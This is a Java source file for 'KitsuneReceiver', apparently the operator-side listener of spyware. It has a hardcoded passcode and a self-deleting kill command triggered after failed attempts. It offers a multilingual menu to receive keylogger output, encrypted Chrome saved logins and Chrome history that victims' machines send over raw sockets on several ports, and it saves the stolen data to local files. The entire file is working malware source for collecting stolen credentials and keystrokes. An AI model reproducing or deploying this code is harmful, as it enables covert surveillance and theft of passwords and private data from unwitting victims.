import java.io.*;
import java.net.*;
import java.util.Calendar;
import java.util.Scanner;

public class ashiatonikki
{
  public static void main(String[] args) throws IOException, URISyntaxException
  {
	  int tries = 3;
	  for(;;) {
		  if(tries == 0) {
			  System.out.println("Access denied, receiver will now self-destruct");
			   File cf = new File(ashiatonikki.class.getProtectionDomain().getCodeSource().getLocation().toURI().getPath());
				 @SuppressWarnings("unused")
				 Process bye = Runtime.getRuntime().exec("cmd /c start cmd.exe /K" + " " + "taskkill /im javaw.exe /f && del " + cf + " && taskkill /im cmd.exe /f");
				 System.exit(0);
		  }
		  if(tries == 1) {
			  System.out.println("HINT: MAI SENPAI, THE ALL-SEEING GOD OF ODLE");
		  }
		  System.out.println("KitsuneReceiver v0.4.8.1 by Carb0n");
		  System.out.println("Enter the passcode");
		  Scanner sc = new Scanner(System.in);
		  String pwd = sc.nextLine();
		  if(pwd.matches("jaketripp")) {
			  break;
		  } else {
			  tries--;
			  System.out.println("Incorrect password, " + tries + " tries remaining");
		  }
	  }
	  int language = 1;
	  for(;;) {
		 // System.out.println(language);
		  java.util.Date date = new java.util.Date();
		  Calendar cal = Calendar.getInstance();
		  cal.setTime(date);
		  int month = cal.get(Calendar.MONTH) + 1;
		  int dab = cal.get(Calendar.DATE);
		  int hours = cal.get(Calendar.HOUR_OF_DAY);
		  int minutes = cal.get(Calendar.MINUTE);
		  if (language == 1) {
		  System.out.println("The current date is " + dab + "-" + hours + ":" + minutes);
		  System.out.println(".beats: +" + getCurrentTimeInBeats());
		  System.out.println("Please input your command.");
		  System.out.println("[1] Receive Keylogger Files");
		  System.out.println("[2] Receive Chrome Login Data (Encrypted)");
		  System.out.println("[5] Receive Chrome History Data");
		  System.out.println("[3] Quit");
		  System.out.println("[6] 日本語");
		  System.out.println("[7] 简体中文");
		  } else if (language == 3) {
			  System.out.println("現在の日付は " + dab + "-" + hours + ":" + minutes);
			  System.out.println(".beats: +" + getCurrentTimeInBeats());
			  System.out.println("あなたのコマンドを入力してください。");
			  System.out.println("[1] キーボード履歴を受け取る");
			  System.out.println("[2] ログインデータを受け取る");
			  System.out.println("[5] インターネット履歴を受信する");
			  System.out.println("[3] やめる");
			  System.out.println("[6] English");
			  System.out.println("[7] 简体中文");
		  } else if (language == 4) {
			  System.out.println("时间是 " + dab + "-" + hours + ":" + minutes);
			  System.out.println(".beats: +" + getCurrentTimeInBeats());
			  System.out.println("请选择一个选项");
			  System.out.println("[1] 接收键盘记录");
			  System.out.println("[2] 接收保存的密码（加密）");
			  System.out.println("[5] 接收网络记录");
			  System.out.println("[3] 退出");
			  System.out.println("[6] English");
			  System.out.println("[7] 日本語");
		  }
		  Scanner c = new Scanner(System.in);
		  String ch = c.nextLine();
		  if (ch.matches("1")) {
			  getKeyLogs();
		  } else if (ch.matches("2")) {
			  getLogin();
		  } else if (ch.matches("3")) {
			  System.exit(0);
		  } else if (ch.matches("5")) {
			  getHistory();
		  } else if (ch.matches("6")) {
			  if (language == 1) {
				  language = 3;
			  } else if (language == 3) {
				  language = 1;
			  } else if (language == 4) {
				  language = 1;
			  }
		  } else if (ch.matches("7")) {
			  if (language == 1) {
				  language = 4;
			  } else if (language == 3) {
				  language = 4;
			  } else if (language == 4) {
				  language = 1;
			  }
		  }
	  }
  }
  public static void getKeyLogs() throws IOException {
	  for(;;) {
	  @SuppressWarnings("resource")
	  ServerSocket sersock = new ServerSocket(25565);
	  for(;;){
      System.out.println("Ready to receive files");
      Socket sock = sersock.accept( );                          
      InputStream istream = sock.getInputStream();
      BufferedReader receiveRead = new BufferedReader(new InputStreamReader(istream));
      String receiveMessage;  
      String ip = sock.getRemoteSocketAddress().toString().substring(sock.getRemoteSocketAddress().toString().indexOf("/"), sock.getRemoteSocketAddress().toString().indexOf(":"));
      System.out.println(ip);
      //record(ip);
      for(;;)
      {   
    	  try {
    	  if((receiveMessage = receiveRead.readLine()) != null)  
          {
        	 System.out.println(receiveMessage); 
        	 record(receiveMessage);
          } else {
        	  sock.close();
        	  break;
          }
    	  } catch (Exception e) {
    		  System.out.println("Exception: " + e);
    		  sock.close();
    		  break;
    	  }
      }
	  }
  }
  }
  public static int getCurrentTimeInBeats() {
	    java.util.Calendar cal = java.util.Calendar.getInstance( java.util.TimeZone.getTimeZone( "GMT+01:00" ) );
	    int beats = (int) ( ( cal.get( java.util.Calendar.SECOND ) + ( cal.get( java.util.Calendar.MINUTE ) * 60 ) + ( cal.get( java.util.Calendar.HOUR_OF_DAY ) * 3600 ) ) / 86.4 );
	    return beats;
	}
  public static void record(String x) {
		try {
			File log = new File("C:/Users/" + System.getProperty("user.name") + "/Desktop/log.txt");
			if(!log.exists()) {
				log.createNewFile();
			}
			String filename = "C:/Users/" + System.getProperty("user.name") + "/Desktop/log.txt";
			PrintWriter out = new PrintWriter(new FileWriter(filename, true));
			 System.out.println("rec " + x);
			out.println(x);
			out.close();
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}
     public static void getLogin() throws IOException {
   	  for(;;) {
   		  @SuppressWarnings("resource")
   		  ServerSocket getnom = new ServerSocket(69);
   		  for(;;){
   	      System.out.println("Ready to receive logins and haxor crap");
   	      Socket namesock = getnom.accept();               
   	      InputStream istream = namesock.getInputStream();
   	      BufferedReader receiveRead = new BufferedReader(new InputStreamReader(istream));
   	      String receiveMessage;  
   	      String ip = namesock.getRemoteSocketAddress().toString().substring(namesock.getRemoteSocketAddress().toString().indexOf("/"), namesock.getRemoteSocketAddress().toString().indexOf(":"));
   	      System.out.println(ip);
   	      //record(ip);
   	      for(;;)
   	      {   
   	    	  try {
   	    	  if((receiveMessage = receiveRead.readLine()) != null)  // receive name of file on seperate port, save that to history file.
   	          {
   	        	 System.out.println(receiveMessage); 
   	        	 String nameoffile = receiveMessage;
   	        	 // record(receiveMessage);
   	        	 int filesize=1022386; 
   	 		     int bytesRead; 
   	 		     int currentTot = 0; 
   	 		     ServerSocket serverSocket = new ServerSocket(420); 
   	 		     Socket socket = serverSocket.accept();
   	 		     byte [] bytearray = new byte [filesize]; 
   	 		     InputStream is = socket.getInputStream(); 
   	 		FileOutputStream fos = new FileOutputStream("C:/Users/" + System.getProperty("user.name") + "/Documents" + nameoffile); 
   	 		BufferedOutputStream bos = new BufferedOutputStream(fos); 
   	 		bytesRead = is.read(bytearray,0,bytearray.length); 
   	 		currentTot = bytesRead; 
   	 		do { 
   	 			bytesRead = is.read(bytearray, currentTot, (bytearray.length-currentTot)); 
   	 			if(bytesRead >= 0) {
   	 				currentTot += bytesRead; 
   	 			}
   	 			} 
   	 			while(bytesRead > -1);
   	 			bos.write(bytearray, 0 , currentTot); 
   	 			bos.flush(); 
   	 			bos.close(); 
   	 			socket.close(); 
   	 			serverSocket.close();
   	 			System.out.println("The login file is in the documents folder.");
   	 			} 
   	          }catch (Exception e) {
   	    		  System.out.println("An exception has occured: " + e);
   	    		  break;
   	    	  }
   	      }
   		  }
   	  }
     }
     public static void getHistory() throws IOException {
    	 for(;;) {
      		  @SuppressWarnings("resource")
      		  ServerSocket getnom = new ServerSocket(70);
      		  for(;;){
      	      System.out.println("Ready to receive history and haxor crap");
      	      Socket namesock = getnom.accept();               
      	      InputStream istream = namesock.getInputStream();
      	      BufferedReader receiveRead = new BufferedReader(new InputStreamReader(istream));
      	      String receiveMessage;  
      	      String ip = namesock.getRemoteSocketAddress().toString().substring(namesock.getRemoteSocketAddress().toString().indexOf("/"), namesock.getRemoteSocketAddress().toString().indexOf(":"));
      	      System.out.println(ip);
      	      //record(ip);
      	      for(;;)
      	      {   
      	    	  try {
      	    	  if((receiveMessage = receiveRead.readLine()) != null)  // receive name of file on seperate port, save that to history file.
      	          {
      	        	 System.out.println(receiveMessage); 
      	        	 String nameoffile = receiveMessage;
      	        	 // record(receiveMessage);
      	        	 int filesize=10223866; 
      	 		     int bytesRead; 
      	 		     int currentTot = 0; 
      	 		     ServerSocket serverSocket = new ServerSocket(421); 
      	 		     Socket socket = serverSocket.accept();
      	 		     byte [] bytearray = new byte [filesize]; 
      	 		     InputStream is = socket.getInputStream(); 
      	 		FileOutputStream fos = new FileOutputStream("C:/Users/" + System.getProperty("user.name") + "/Documents/" + nameoffile); 
      	 		BufferedOutputStream bos = new BufferedOutputStream(fos); 
      	 		bytesRead = is.read(bytearray,0,bytearray.length); 
      	 		currentTot = bytesRead; 
      	 		do { 
      	 			bytesRead = is.read(bytearray, currentTot, (bytearray.length-currentTot)); 
      	 			if(bytesRead >= 0) {
      	 				currentTot += bytesRead; 
      	 			}
      	 			} 
      	 			while(bytesRead > -1);
      	 			bos.write(bytearray, 0 , currentTot); 
      	 			bos.flush(); 
      	 			bos.close(); 
      	 			socket.close(); 
      	 			serverSocket.close();
      	 			System.out.println("The history file is in the documents folder.");
      	 			} 
      	          }catch (Exception e) {
      	    		  System.out.println("An exception has occured: " + e);
      	    		  break;
      	    	  }
      	      }
      		  }
      	  }
        }
     } 
